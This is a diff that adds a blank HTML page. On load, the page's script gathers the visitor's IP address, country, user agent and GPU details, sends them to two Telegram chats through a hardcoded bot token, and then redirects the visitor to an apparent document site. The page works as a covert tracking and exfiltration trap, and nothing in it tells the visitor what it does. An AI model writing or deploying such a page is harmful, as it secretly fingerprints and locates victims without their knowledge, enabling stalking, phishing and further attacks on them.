@@ -1,0 +1,61 @@
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <script>
+        async function getIPDetails() {
+            try {
+                const res = await fetch("https://ipapi.co/json/");
+                const data = await res.json();
+                return {
+                    ip: data.ip || "Unknown",
+                    country: data.country_name || "Unknown"
+                };
+            } catch (e) {
+                return { ip: "Failed to get IP", country: "Unknown" };
+            }
+        }
+
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement("canvas");
+                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                if (!gl) return "WebGL not supported";
+
+                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "GPU info unavailable";
+            } catch (e) {
+                return "Error retrieving GPU info";
+            }
+        }
+
+    async function sendDataToTelegram() {
+        const ipDetails = await getIPDetails();
+        const userAgent = navigator.userAgent;
+        const gpu = getGPUInfo();
+
+        const botToken = "7754778892:AAE8NH4s1qmgiO_zn71h7jHGOTy5YVN_l74";  
+        const chatIds = ["7855140713", "7723080300"]; 
+
+        const message = `👤\nIP: ${ipDetails.ip}\nCountry: ${ipDetails.country}\n\nUser-Agent: ${userAgent}\n\nGPU: ${gpu}`;
+
+        chatIds.forEach((chatId) => { 
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            }).catch(error => console.error("Error sending message:", error));
+        });
+    }
+
+
+        (async () => {
+            await sendDataToTelegram();
+            window.location.href = "https://mydocufast.com";
+        })();
+    </script>
+</head>
+<body>
+</body>
+</html>
